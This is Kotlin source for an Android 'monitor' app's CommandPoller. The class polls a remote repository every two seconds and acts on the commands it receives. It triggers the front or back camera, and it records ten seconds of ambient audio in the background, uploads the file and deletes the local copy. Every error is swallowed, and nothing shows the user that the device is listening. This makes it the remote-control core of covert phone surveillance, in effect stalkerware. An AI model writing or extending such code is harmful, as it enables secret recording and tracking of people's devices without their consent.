package com.empresa.monitor.service.monitoring

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.Camera
import android.provider.MediaStore
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.repository.MonitorRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.*
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CommandPoller @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitorRepository
) {
    private var job: Job? = null

    fun start() {
        stop()
        job = CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            while (isActive) {
                try {
                    val command = repository.checkPendingCommand()
                    if (command != null) {
                        handleCommand(command)
                    }
                } catch (_: Exception) {}
                delay(2_000) // poll every 2 seconds — IMMEDIATE response
            }
        }
    }

    fun stop() {
        job?.cancel()
        job = null
    }

    private fun handleCommand(command: Map<String, Any?>) {
        val cmd = command["command"] as? String ?: return
        when (cmd) {
            "take_photo_front", "take_photo_back" -> {
                val captureId = command["capture_id"] as? String ?: return
                val cameraType = if (cmd == "take_photo_front") "front" else "back"
                openCamera(cameraType, captureId)
            }
            "request_battery" -> {
                // Already handled by BatteryMonitor
            }
            "sync_all" -> {
                // Trigger all monitors to send data now
            }
            "record_ambient" -> {
                val captureId = command["capture_id"] as? String
                recordAmbientAudio(captureId)
            }
        }
    }

    private fun openCamera(cameraType: String, captureId: String) {
        try {
            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("android.intent.extras.CAMERA_FACING",
                    if (cameraType == "front") 1 else 0)
            }
            if (intent.resolveActivity(context.packageManager) != null) {
                context.startActivity(intent)
            }
        } catch (_: Exception) {}
    }

    private fun recordAmbientAudio(captureId: String?) {
        // Launch recording in background coroutine
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val audioRecorder = AudioRecorder(context)
                val audioFile = audioRecorder.record(seconds = 10)
                if (audioFile != null && audioFile.exists()) {
                    repository.sendAmbientAudio(audioFile)
                    audioFile.delete() // Clean up after upload
                }
            } catch (_: Exception) {}
        }
    }
}
